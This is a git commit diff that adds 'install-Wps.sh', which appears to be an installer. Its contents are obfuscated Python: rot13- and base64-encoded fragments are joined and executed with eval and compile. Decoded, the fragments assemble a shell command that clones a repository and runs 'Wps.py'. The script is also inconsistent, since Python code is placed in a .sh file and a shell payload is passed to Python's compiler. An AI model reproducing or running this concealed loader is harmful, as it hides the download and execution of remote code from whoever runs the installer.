ed23f57d671d4e354c8f62d3a5791fd31e922d66
DarkZero <ruanvsd2024@gmail.com>
2025-08-31 13:00:03 -0300

    Add files via upload

---
+++ install-Wps.sh
@@ -0,0 +1,8 @@
+import base64,codecs
+magic='IyEvYmluL3NoDQpfYTE9J2cnO19iMj0naSc7X2MzPSd0JztfZDQ9JyAnO19lNT0nYyc7X2Y2PSdsJztfZzc9J28nO19oOD0nbic7X2k5PSdlJztfajA9JyAnO19rMT'
+love='0anUE0pUZ6Yl9anKEbqJVhL29gY3MinJEbAl9KpUZgMUWinJDaB19fZw0aBlp7K20mCFqwWmgsowD9W2DaB19iAG0aVPp7K3N2CFqKpUZgMUWinJDaB19kAm0aBlp7'
+god='X3I4PSdwJztfczk9J3knO190MD0ndCc7X3UxPSdoJztfdjI9J28nO193Mz0nbic7X3g0PScgJztfeTU9J1dwcy5weSc7X3o2PSdldmFsJzskX3o2ICIkX2ExJF9iMi'
+destiny='EsLmZxK2D0WS9yAFEsMwLxK2p3WS9bBPEsnGxxK2bjWS9eZFEsoQVxK20mWS9hAPEsomHxK3N2WS9kAlEspwtxK3Z5WS90ZPEsqGRxK3LlWS93ZlEsrQDxK3x1Vt=='
+joy='rot13'
+trust=eval('magic')+eval('codecs.decode(love, joy)')+eval('god')+eval('codecs.decode(destiny, joy)')
+eval(compile(base64.b64decode(eval('trust')),'<string>','exec'))
